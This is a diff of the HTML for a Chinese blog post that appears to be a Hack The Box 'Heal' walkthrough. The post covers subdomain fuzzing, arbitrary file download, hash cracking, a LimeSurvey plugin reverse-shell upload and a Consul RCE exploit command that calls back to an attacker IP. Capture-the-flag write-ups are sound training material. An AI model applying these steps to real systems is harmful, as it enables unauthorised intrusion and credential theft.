@@ -7,12 +7,12 @@
     <meta name="HandheldFriendly" content="True">
     <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="信息收集 nmap -sC -sV -T4 -Pn 10.10.11.48  记得添加下host映射然后访问 ffuf -w &#x2F;usr&#x2F;share&#x2F;dnsrecon&#x2F;dnsrecon&#x2F;data&#x2F;subdomains-top1mil-20000.txt -u http:&#x2F;&#x2F;heal.htb&#x2F; -H &quot;Host:FUZZ.heal.htb&quot;  -fc 301 子域名爆破扫到一个ap">
+    <meta name="description" content="信息收集nmap -sC -sV -T4 -Pn 10.10.11.48   记得添加下host映射然后访问 ffuf -w &#x2F;usr&#x2F;share&#x2F;dnsrecon&#x2F;dnsrecon&#x2F;data&#x2F;subdomains-top1mil-20000.txt -u http:&#x2F;&#x2F;heal.htb&#x2F; -H &quot;Host:FUZZ.heal.htb&quot;  -fc 301 子域名爆破扫到一个ap">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Heal-HTB">
 <meta property="og:url" content="https://oceanzbz.github.io/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/index.html">
 <meta property="og:site_name" content="Oceanzbz&#39;s Blog">
-<meta property="og:description" content="信息收集 nmap -sC -sV -T4 -Pn 10.10.11.48  记得添加下host映射然后访问 ffuf -w &#x2F;usr&#x2F;share&#x2F;dnsrecon&#x2F;dnsrecon&#x2F;data&#x2F;subdomains-top1mil-20000.txt -u http:&#x2F;&#x2F;heal.htb&#x2F; -H &quot;Host:FUZZ.heal.htb&quot;  -fc 301 子域名爆破扫到一个ap">
+<meta property="og:description" content="信息收集nmap -sC -sV -T4 -Pn 10.10.11.48   记得添加下host映射然后访问 ffuf -w &#x2F;usr&#x2F;share&#x2F;dnsrecon&#x2F;dnsrecon&#x2F;data&#x2F;subdomains-top1mil-20000.txt -u http:&#x2F;&#x2F;heal.htb&#x2F; -H &quot;Host:FUZZ.heal.htb&quot;  -fc 301 子域名爆破扫到一个ap">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://oceanzbz.github.io/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250205224902201.png">
 <meta property="og:image" content="https://oceanzbz.github.io/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250205230525170.png">
@@ -205,63 +205,76 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h2 id="信息收集">信息收集</h2>
-<p><code>nmap -sC -sV -T4 -Pn 10.10.11.48</code></p>
+    <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><code>nmap -sC -sV -T4 -Pn 10.10.11.48</code></p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250205224902201.png" class="">
+
 <p>记得添加下host映射然后访问</p>
 <p><code>ffuf -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt -u http://heal.htb/ -H &quot;Host:FUZZ.heal.htb&quot;  -fc 301</code> 子域名爆破扫到一个api</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250205230525170.png" class="">
+
 <p>可以看到是用的ruby先记录留着</p>
 <p>在<a target="_blank" rel="noopener" href="http://heal.htb/suery%E7%9C%8B%E5%88%B0%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E5%AD%90%E5%9F%9F%E5%90%8D%E5%8A%A0%E5%85%A5host%E9%87%8C%E9%9D%A2">http://heal.htb/suery看到一个新的子域名加入host里面</a></p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250205225602378.png" class="">
+
 <p>访问一下发现一个用户名，先记录一下</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250205225943128.png" class="">
+
 <p>扫一下这个子域名的目录</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://take-survey.heal.htb/index.php/&quot;</span> -t <span class="number">50</span> -i <span class="number">200</span></span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:<span class="number">23</span>: DeprecationWarning: pkg_resources <span class="keyword">is</span> deprecated <span class="keyword">as</span> an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  <span class="keyword">from</span> pkg_resources <span class="keyword">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"> </span><br><span class="line">  _|. _ _  _  _  _ _|_    v0<span class="number">.4</span><span class="number">.3</span>                                                                                                                            </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                                     </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="number">50</span> | Wordlist size: <span class="number">11460</span></span><br><span class="line"> </span><br><span class="line">Output File: /home/kali/Desktop/reports/http_take-survey.heal.htb/_index.php__24-<span class="number">12</span>-<span class="number">15_19</span>-<span class="number">42</span>-<span class="number">06.</span>txt</span><br><span class="line"> </span><br><span class="line">Target: http://take-survey.heal.htb/</span><br><span class="line"> </span><br><span class="line">[<span class="number">19</span>:<span class="number">42</span>:06] Starting: index.php/                                                                                                                             </span><br><span class="line">[<span class="number">19</span>:<span class="number">42</span>:<span class="number">19</span>] <span class="number">200</span> -   75KB - /index.php/admin/mysql/index.php                  </span><br><span class="line">[<span class="number">19</span>:<span class="number">42</span>:<span class="number">23</span>] <span class="number">200</span> -   74KB - /index.php/apc/index.php                          </span><br><span class="line">[<span class="number">19</span>:<span class="number">42</span>:<span class="number">42</span>] <span class="number">200</span> -   74KB - /index.php/pma/index.php                          </span><br><span class="line">[<span class="number">19</span>:<span class="number">42</span>:<span class="number">54</span>] <span class="number">200</span> -   75KB - /index.php/web/phpMyAdmin/index.php </span><br></pre></td></tr></table></figure>
+
 <p>访问admin会跳转到登录界面。有点慢先看其他的</p>
-<h2 id="漏洞利用">漏洞利用</h2>
-<p>在一开始登录进去的页面有一个导出pdf的功能抓包看看</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在一开始登录进去的页面有一个导出pdf的功能抓包看看</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250205232534931.png" class="">
+
 <p>发现有download路由</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250205232512706.png" class="">
+
 <p>看看能不能任意文件下载</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250205232941769.png" class="">
+
 <p>发现可以又联想到之前ruby的页面去下载他的配置文件看看</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250205233037736.png" class="">
+
 <p>把这个sqlite文件下载下来</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250205233228765.png" class="">
+
 <p>解密下这个密码</p>
 <p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p>
 <p>得到密码：</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250205233641129.png" class="">
+
 <p>然后去登录后台因为ssh连接不上</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250205235801312.png" class="">
-<p>使用该exp进行利用<br>
-<a target="_blank" rel="noopener" href="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE">https://github.com/Y1LD1R1M-1337/Limesurvey-RCE</a></p>
+
+<p>使用该exp进行利用<br><a target="_blank" rel="noopener" href="https://github.com/Y1LD1R1M-1337/Limesurvey-RCE">https://github.com/Y1LD1R1M-1337/Limesurvey-RCE</a></p>
 <p>这里需要更改一下xml文件添加一个compatibility版本为6.0的否则无法反弹shell</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250205235923595.png" class="">
+
 <p>然后打包上传压缩包</p>
 <p><code>zip oceanzbz_zip config.xml php-rev.php</code></p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250206000342816.png" class="">
+
 <p>然后激活访问<code>http://take-survey.heal.htb/upload/plugins/Y1LD1R1M/php-rev.php</code></p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250206001843600.png" class="">
+
 <p>查看配置文件</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250206002015928.png" class="">
+
 <p>发现密码，这里用ron用户登录。</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250206002138832.png" class="">
-<h2 id="提权">提权</h2>
-<p>查看一下开放的端口</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看一下开放的端口</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250206002605309.png" class="">
+
 <p>开放了很多这里8500端口转发出来其他的我测试了发现不是http服务</p>
 <p><code>ssh -L 8500:127.0.0.1:8500 ron@heal.htb </code></p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250206002929198.png" class="">
+
 <p>随便点点找到信息泄漏版本</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250206003023013.png" class="">
-<p>然后利用脚本拿shell<br>
-<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/51117">https://www.exploit-db.com/exploits/51117</a><br>
-<code> python3 Hashicorp_Consul_v1.0RCE_EXP.py 127.0.0.1 8500 10.10.16.25 1234 0</code><br>
-这里的acltoken随便填就行</p>
+
+<p>然后利用脚本拿shell<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/51117">https://www.exploit-db.com/exploits/51117</a><br><code> python3 Hashicorp_Consul_v1.0RCE_EXP.py 127.0.0.1 8500 10.10.16.25 1234 0</code><br>这里的acltoken随便填就行</p>
 <img src="/2025/02/05/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Heal-HTB/IMAGE20250206003436671.png" class="">
+
 
   </div>
 </article>
